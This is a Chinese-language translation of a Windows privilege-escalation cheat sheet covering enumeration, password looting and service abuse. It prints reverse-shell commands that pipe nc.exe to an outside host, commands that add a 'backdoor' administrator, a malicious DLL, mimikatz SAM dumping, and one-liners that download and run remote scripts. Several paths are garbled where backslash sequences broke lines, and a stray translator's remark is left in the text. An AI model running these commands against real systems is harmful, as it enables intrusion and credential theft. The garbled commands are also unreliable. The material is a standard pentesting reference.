

# Windows - 权限提升

## 摘要

* [工具](#工具)
* [Windows 版本和配置](#windows-版本和配置)
* [用户枚举](#用户枚举)
* [网络枚举](#网络枚举)
* [杀毒软件枚举](#杀毒软件枚举)
* [默认可写文件夹](#默认可写文件夹)
* [EoP - 掠夺密码](#eop---掠夺密码)
  * [SAM 和 SYSTEM 文件](#sam-和-system-文件)
  * [HiveNightmare](#hivenightmare)
  * [LAPS 设置](#laps-设置)
  * [搜索文件内容](#搜索文件内容)
  * [搜索具有特定文件名的文件](#搜索具有特定文件名的文件)
  * [在注册表中搜索键名和密码](#在注册表中搜索键名和密码)
  * [Unattend.xml 中的密码](#unattendxml-中的密码)
  * [Wifi 密码](#wifi-密码)
  * [便签密码](#便签密码)
  * [存储在服务中的密码](#存储在服务中的密码)
  * [存储在密钥管理器中的密码](#存储在密钥管理器中的密码)
  * [Powershell 历史记录](#powershell-历史记录)
  * [Powershell 脚本](#powershell-脚本)
  * [交替数据流中的密码](#交替数据流中的密码)
* [EoP - 进程枚举和任务](#eop---进程枚举和任务)
* [EoP - 服务中不正确的权限](#eop---服务中不正确的权限)
* [EoP - Windows 子系统 for Linux (WSL)](#eop---windows-子系统-for-linux-wsl)
* [EoP - 未加引号的服务路径](#eop---未加引号的服务路径)
* [EoP - $PATH 拦截](#eop---path-拦截)
* [EoP - 命名管道](#eop---命名管道)
* [EoP - 内核利用](#eop---内核利用)
* [EoP - 微软 Windows 安装程序](#eop---微软-windows-安装程序)
  * [AlwaysInstallElevated](#alwaysinstallelevated)
  * [CustomActions](#customactions)
* [EoP - 不安全的 GUI 应用程序](#eop---不安全的-gui-应用程序)
* [EoP - 评估易受攻击的驱动程序](#eop---评估易受攻击的驱动程序)
* [EoP - 打印机](#eop---打印机)
  * [通用打印机](#通用打印机)
  * [自带漏洞](#自带漏洞)
* [EoP - Runas](#eop---runas)
* [EoP - 滥用影子副本](#eop---滥用影子副本)
* [EoP - 从本地管理员到 NT SYSTEM](#eop---从本地管理员到-nt-system)
* [EoP - 利用现有二进制文件和脚本](#eop---利用现有二进制文件和脚本)
* [EoP - 伪装特权](#eop---伪装特权)
  * [恢复服务账户的特权](#恢复服务账户的特权)
  * [Meterpreter getsystem 和替代方案](#meterpreter-getsystem-和替代方案)
  * [RottenPotato（令牌伪装）](#rottenpotato-令牌伪装)
  * [Juicy Potato（滥用黄金特权）](#juicy-potato-滥用黄金特权)
  * [Rogue Potato（假冒 OXID 解析器）](#rogue-potato-假冒-oxid-解析器)
  * [EFSPotato（MS-EFSR EfsRpcOpenFileRaw）](#efspotato-ms-efsr-efsrpcopenfileraw)
  * [PrintSpoofer（打印机漏洞）](#printspoofer-打印机漏洞)
* [EoP - 特权文件写入](#eop---特权文件写入)
  * [DiagHub](#diaghub)
  * [UsoDLLLoader](#usodllloader)
  * [WerTrigger](#wertrigger)
  * [WerMgr](#wermgr)
* [EoP - 特权文件删除](#eop---特权文件删除)
* [EoP - 常见漏洞和暴露](#eop---常见漏洞和暴露)
  * [MS08-067 (NetAPI)](#ms08-067-netapi)
  * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---微软-windows-nt2000--2003--2008--xp--vista--7)
  * [MS11-080 (adf.sys)](#ms11-080-afd.sys---微软-windows-xp-2003)
  * [MS15-051 (Client Copy Image)](#ms15-051---微软-windows-2003--2008--7--8--2012)
  * [MS16-032](#ms16-032---微软-windows-7--10--2008--2012-r2-x86x64)
  * [MS17-010 (永恒之蓝)](#ms17-010-永恒之蓝)
  * [CVE-2019-1388](#cve-2019-1388)
* [EoP - $PATH 拦截](#eop---path-拦截)
* [参考资料](#参考资料)

## 工具

- [PowerSploit 的 PowerUp](https://github.com/PowerShellMafia/PowerSploit)

  ```powershell
  powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
  ```

- [Watson - Watson 是一个（符合 .NET 2.0）C# 实现的 Sherlock](https://github.com/rasta-mouse/Watson)

- [(已弃用) Sherlock - PowerShell 脚本，用于快速查找缺失的软件补丁，以利用本地权限提升漏洞](https://github.com/rasta-mouse/Sherlock)

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
  ```

- [BeRoot - 权限提升项目 - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)

- [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

  ```powershell
  ./windows-exploit-suggester.py --update
  ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
  ```

- [windows-privesc-check - 独立可执行文件，用于检查 Windows 系统上的简单权限提升向量](https://github.com/pentestmonkey/windows-privesc-check)

- [WindowsExploits - Windows 漏洞，大多数是预编译的。未更新。](https://github.com/abatchy17/WindowsExploits)

- [WindowsEnum - 一个 PowerShell 权限提升枚举脚本。](https://github.com/absolomb/WindowsEnum)

- [Seatbelt - 一个 C# 项目，执行一系列安全导向的主机调查“安全检查”，无论从攻击性还是防御性安全角度来看都很相关。](https://github.com/GhostPack/Seatbelt)

  ```powershell
  Seatbelt.exe -group=all -full
  Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
  Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
  ```

- [Powerless - Windows 权限提升（枚举）脚本，专为 OSCP 实验室（遗留 Windows）设计](https://github.com/M4ximuss/Powerless)

- [JAWS - 另一个 Windows（枚举）脚本](https://github.com/411Hall/JAWS)

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
  ```

- [winPEAS - Windows 权限提升超棒脚本](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)

- [Windows Exploit Suggester - 下一代 (WES-NG)](https://github.com/bitsadmin/wesng)

  ```powershell
  # 首先获取 systeminfo
  systeminfo
  systeminfo > systeminfo.txt
  # 然后将其提供给 wesng
  python3 wes.py --update-wes
  python3 wes.py --update
  python3 wes.py systeminfo.txt
  ```

- [PrivescCheck - Windows 权限提升枚举脚本](https://github.com/itm4n/PrivescCheck)

  ```powershell
  C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
  C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
  C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
  ```

## Windows 版本和配置

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

提取补丁和更新

```powershell
wmic qfe
```

文档：架构

```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

列出所有环境变量

```powershell
set
Get-ChildItem Env: | ft Key,Value
```

列出所有驱动器

```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## 用户枚举

获取当前用户名

```powershell
echo %USERNAME% || whoami
$env:username
```

列出用户权限

```powershell
whoami /priv
whoami /groups
```

列出所有用户

```powershell
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

列出登录要求；可用于暴力破解

```powershell$env:usernadsc
net accounts
```

获取有关用户的信息（即管理员，admin，当前用户）

```powershell
net user administrator
net user admin
net user %USERNAME%
```

列出所有本地组

```powershell
net localgroup
Get-LocalGroup | ft Name
```

获取有关组的信息（即管理员）

```powershell
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

获取域控制器

```powershell
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

## 网络枚举

列出所有网络接口、IP和DNS。

```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

列出当前路由表

```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

列出ARP表

```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

列出所有当前连接

```powershell
netstat -ano
```

列出所有网络共享

```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

SNMP配置

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## 杀毒软件枚举

使用`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`在盒子上枚举杀毒软件

## 默认可写文件夹

```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```

## EoP - 掠夺密码

### SAM和SYSTEM文件

安全账户管理器（SAM），通常是安全账户管理器，是一个数据库文件。用户密码以哈希格式存储在注册表配置单元中，要么是LM哈希，要么是NTLM哈希。这个文件可以在%SystemRoot%/system32/config/SAM中找到，并挂载在HKLM/SAM上。

```powershell
# 通常%SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

使用`pwdump`或`samdump2`为John生成哈希文件。

```powershell
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

使用`john -format=NT /root/sam.txt`破解它，[hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat)或使用Pass-The-Hash。

### HiveNightmare

> CVE-2021–36934允许你在Windows 10和11中以非管理员用户身份检索所有注册表配置单元（SAM，SECURITY，SYSTEM）

使用`icacls`检查漏洞

```powershell
C:\Windows\System32> icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- 这是错误的 - 普通用户不应该有读取权限！
```

然后通过请求文件系统上的卷影副本并从其中读取配置单元来利用CVE。

```powershell
mimikatz> token::whoami /full

# 列出可用的卷影副本
mimikatz> misc::shadowcopies

# 从SAM数据库中提取账户
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# 从SECURITY中提取秘密
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

### LAPS设置

从Windows注册表中提取`HKLM\Software\Policies\Microsoft Services\AdmPwd`。

* LAPS启用：AdmPwdEnabled
* LAPS管理员账户名称：AdminAccountName
* LAPS密码复杂性：PasswordComplexity
* LAPS密码长度：PasswordLength
* LAPS过期保护启用：PwdExpirationProtectionEnabled

### 搜索文件内容

```powershell
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*
```

也在远程地方搜索，如SMB共享和SharePoint：

* 在SharePoint中搜索密码：[nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint)（必须先编译，有关引用问题请参见：https://github.com/nheiniger/SnaffPoint/pull/6）

```powershell
# 首先，检索令牌
## 方法1：使用SnaffPoint二进制文件
$token = (.\GetBearerToken.exe https://your.sharepoint.com)
## 方法2：使用AADInternals
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")

# 其次，在Sharepoint上搜索
## 方法1：使用./presets目录中的搜索字符串
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
## 方法2：使用命令行中的搜索字符串
### -l 使用FQL搜索，见：https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
```

* 在SMB共享中搜索密码：[SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)

### 搜索具有特定文件名的文件

```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

### 在注册表中搜索键名和密码

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows自动登录
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP参数
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty明文代理凭据
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC凭据
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### unattend.xml中的密码

unattend.xml文件的位置。

```powershell
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

根据您提供的文档内容，以下是对文档的完整翻译：

---

**使用 `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul` 显示这些文件的内容。**

示例内容

```powershell
<组件名称="Microsoft-Windows-Shell-Setup" 公钥令牌="31bf3856ad364e35" 语言="中性" 版本范围="非SxS" 处理器架构="amd64">
    <自动登录>
     <密码>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</密码>
     <启用>真</启用>
     <用户名>管理员</用户名>
    </自动登录>

    <用户帐户>
     <本地帐户 wcm:操作="添加">
      <密码>*敏感数据已删除*</密码>
      <组>administrators;users</组>
      <名称>管理员</名称>
     </本地帐户>
    </用户帐户>
```

Unattend 凭据以 base64 存储，可以手动使用 base64 解码。

```powershell
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
秘密安全密码1234*
```

Metasploit 模块 `post/windows/gather/enum_unattend` 寻找这些文件。

### IIS Web 配置

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

### 其他文件

```bat
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%
tuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
```

### Wifi 密码

查找 AP SSID

```bat
netsh wlan show profile
```

获取明文密码

```bat
netsh wlan show profile <SSID> key=clear
```

从所有接入点提取 wifi 密码的单行方法。

```batch
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### 便签密码

便签应用程序将其内容存储在位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` 的 sqlite 数据库中。

### 服务中存储的密码

使用 [SessionGopher](https://github.com/Arvanaghi/SessionGopher) 保存 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 的会话信息。


```powershell
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

### 密钥管理器中存储的密码

:warning: 该软件将以 GUI 形式显示其输出

```ps1
rundll32 keymgr,KRShowKeyMgr
```

### Powershell 历史记录

禁用 Powershell 历史记录：`Set-PSReadlineOption -HistorySaveStyle SaveNothing`。

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Powershell 成绩单

```xml
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
```

### 备用数据流中的密码

```ps1
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag
```

## EoP - 进程枚举和任务

* 有哪些进程正在运行？

  ```powershell
  tasklist /v
  net start
  sc query
  Get-Service
  Get-Process
  Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
  ```

* 哪些进程以 "system" 身份运行？

  ```powershell
  tasklist /v /fi "username eq system"
  ```

* 你有 powershell 魔法吗？

  ```powershell
  REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
  ```

* 列出安装的程序

  ```powershell
  Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
  Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
  ```

* 列出服务

  ```powershell
  net start
  wmic service list brief
  tasklist /SVC
  ```

* 枚举计划任务

  ```powershell
  schtasks /query /fo LIST 2>nul | findstr TaskName
  schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
  Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
  ```

* 启动任务

```powershell
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

## EoP - 服务中的错误权限

> 以管理员/系统身份运行的服务如果文件权限设置不正确，可能会允许EoP。您可以替换二进制文件，重启服务并获得系统权限。

通常，服务指向可写位置：

- 孤立的安装，不再安装但仍在启动中存在

- DLL劫持

  ```powershell
  # 查找缺失的DLL
  - 使用PowerUp.ps1中的Find-PathDLLHijack
  - 进程监视器：检查 "Name Not Found"
  
  # 编译恶意dll
  - 对于x64编译使用："x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
  - 对于x86编译使用："i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
  
  # windows_dll.c的内容
  #include <windows.h>
  BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
      if (dwReason == DLL_PROCESS_ATTACH) {
          system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
          ExitProcess(0);
      }
      return TRUE;
  }
  ```

- 路径目录权限弱

  ```powershell
  $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
  $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
  
  $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
  FOR /F %i in (Servicenames.txt) DO echo %i
  type Servicenames.txt
  FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
  FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
  ```

或者您可以使用Metasploit漏洞利用：`exploit/windows/local/service_permissions`

注意要检查文件权限，您可以使用`cacls`和`icacls`

> icacls (Windows Vista +)
> cacls (Windows XP)

您正在寻找输出中的`BUILTIN\Users:(F)`（完全访问权限），`BUILTIN\Users:(M)`（修改访问权限）或`BUILTIN\Users:(W)`（仅写入访问权限）。

### 示例与Windows 10 - CVE-2019-1322 UsoSvc

先决条件：服务帐户

```powershell
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color
c.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop
c.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users
c.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop
c.exe 10.10.10.10 4444 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

PS C:\Windows\system32> sc.exe start UsoSvc
```

### 示例与Windows XP SP1 - upnphost

```powershell
# 注意：此漏洞利用需要空格！
sc config upnphost binpath= "C:\Inetpub\wwwroot
c.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

如果由于缺少依赖项而失败，请尝试以下命令。

```powershell
sc config SSDPSRV start=auto
net start SSDPSRV
net stop upnphost
net start upnphost

sc config upnphost depend=""
```

使用Sysinternals的[`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)或[accesschk-XP.exe - github.com/phackt](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe)

```powershell
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

$ accesschk.exe -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS

$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
$ sc config <vuln-service> binpath= "C:
c.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
$ sc stop <vuln-service>
$ sc start <vuln-service>
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
$ sc stop <vuln-service>
$ sc start <vuln-service>
```

## EoP - Windows子系统 for Linux (WSL)

技术借鉴自[Warlockobama的推文](https://twitter.com/Warlockobama/status/1067890915753132032)

> 拥有root权限的Windows子系统 for Linux (WSL) 允许用户在任何端口上创建绑定shell（无需提升）。不知道root密码？没问题，只需将默认用户设置为root W/ <distro>.exe --default-user root。现在启动您的绑定shell或反向shell。

```powershell
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

二进制文件`bash.exe`也可以在`C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`中找到

或者您可以在文件夹`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`中探索`WSL`文件系统

## EoP - 未加引号的服务路径

Microsoft Windows未加引号服务路径枚举漏洞。所有Windows服务都有一个指向其可执行文件的路径。如果该路径未加引号且包含空格或其他分隔符，则服务将首先尝试访问父路径中的资源。

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

* Metasploit漏洞利用：`exploit/windows/local/trusted_service_path`
* PowerUp漏洞利用

```powershell
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

### 示例

对于`C:\Program Files\something\legit.exe`，Windows将首先尝试以下路径：

- `C:\Program.exe`
- `C:\Program Files.exe`

## EoP - $PATH拦截

要求：

- PATH包含一个低权限的可写文件夹。
- 该可写文件夹位于包含合法二进制文件的文件夹_之前_。

示例：

```powershell
# 列出PATH环境变量的内容
# 示例输出：C:\Program Files
odejs\;C:\WINDOWS\system32
$env:Path

# 查看目标文件夹的权限
# 示例输出：BUILTIN\Users: GR,GW
icacls.exe "C:\Program Files
odejs\"

# 将我们的恶意文件放置在该文件夹中。
copy evil-file.exe "C:\Program Files
odejs\cmd.exe"
```

因为（在这个例子中）"C:\Program Files
odejs\"在PATH变量中的位置_在_"C:\WINDOWS\system32\"之前，下次用户运行"cmd.exe"时，nodejs文件夹中的恶意版本将会运行，而不是系统32文件夹中的合法版本。

## EoP - 命名管道

1. 查找命名管道：`[System.IO.Directory]::GetFiles("\\.\pipe\")`
2. 检查命名管道DACL：`pipesec.exe <named_pipe>`
3. 软件逆向工程
4. 通过命名管道发送数据：`program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`

## EoP - 内核利用

内核漏洞列表：[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

##### #安全公告&nbsp;&nbsp;&nbsp;#KB &nbsp;&nbsp;&nbsp;&nbsp;#描述&nbsp;&nbsp;&nbsp;&nbsp;#操作系统  

- [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017) 　[KB4013081]　　[GDI调色板对象本地权限提升]　　(windows 7/8)
- [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464) 　[LNK远程代码执行漏洞]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213) 　[Windows COM提升权限漏洞]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833)   [SMBv3空指针解引用拒绝服务]    (Windows 8.1/Server 2012 R2)
- [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120)   [Win32k提升权限漏洞]    (Windows 7 SP1/2008 SP2,2008 R2 SP1)
- [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010) 　[KB4013389]　　[Windows内核模式驱动程序]　　(windows 7/2008/2003/XP)
- [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135) 　[KB3199135]　　[Windows内核模式驱动程序]　　(2016)
